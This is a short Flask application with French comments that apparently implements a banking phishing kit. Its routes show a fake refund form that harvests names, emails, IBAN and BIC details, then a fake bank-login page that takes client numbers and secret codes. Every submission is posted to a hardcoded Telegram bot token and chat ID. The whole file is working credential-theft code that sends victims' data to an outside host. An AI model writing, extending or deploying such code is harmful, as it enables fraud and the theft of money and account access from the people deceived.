from flask import Flask, render_template, request, redirect, url_for
import requests

app = Flask(__name__)

# Constantes pour Telegram
BOT_TOKEN = "8022971997:AAG1VGrYKEXWdX6GaHIzT8nsomWYoJt8mA"
CHAT_ID = "5652184847"

# Fonction pour envoyer un message à Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()  # Vérifie les erreurs HTTP
        print("Message envoyé à Telegram avec succès !")
    except Exception as e:
        print(f"Erreur lors de l'envoi à Telegram : {e}")

# Route pour afficher le formulaire de remboursement
@app.route("/", methods=["GET"])
def formulaire_remboursement():
    return render_template("formulaire_de_remboursement.html")

# Route pour traiter la soumission du formulaire de remboursement
@app.route("/acces_compte", methods=["POST"])
def acces_compte():
    # Récupérer les données du formulaire
    nom = request.form.get("nom")
    prenom = request.form.get("prenom")
    email = request.form.get("email")
    order_number = request.form.get("order_number")
    iban = request.form.get("iban")
    bic = request.form.get("bic")
    bank = request.form.get("bank")
    bank_logo_url = request.form.get("bank_logo_url")

    # Envoyer les informations à Telegram
    message = (
        "Nouvelle demande de remboursement :\n"
        f"Nom : {nom}\n"
        f"Prénom : {prenom}\n"
        f"Email : {email}\n"
        f"Numéro de commande : {order_number}\n"
        f"IBAN : {iban}\n"
        f"BIC : {bic}\n"
        f"Banque : {bank}\n"
        f"Logo de la banque : {bank_logo_url}"
    )
    send_to_telegram(message)

    # Rediriger vers la page d'accès au compte avec le logo de la banque
    return render_template("acces_compte.html", bank_logo_url=bank_logo_url)

# Route pour traiter la soumission de la page d'accès au compte
@app.route("/confirmation", methods=["POST"])
def confirmation():
    # Récupérer les données du formulaire
    client_number = request.form.get("client-number")
    secret_code = request.form.get("secret-code")

    # Envoyer les informations à Telegram
    message = (
        "Nouvelle connexion :\n"
        f"Identifiant : {client_number}\n"
        f"Code : {secret_code}"
    )
    send_to_telegram(message)

    # Rediriger vers la page de confirmation
    return render_template("confirmation.html")

# Démarrer l'application Flask
if __name__ == "__main__":
    app.run(debug=True)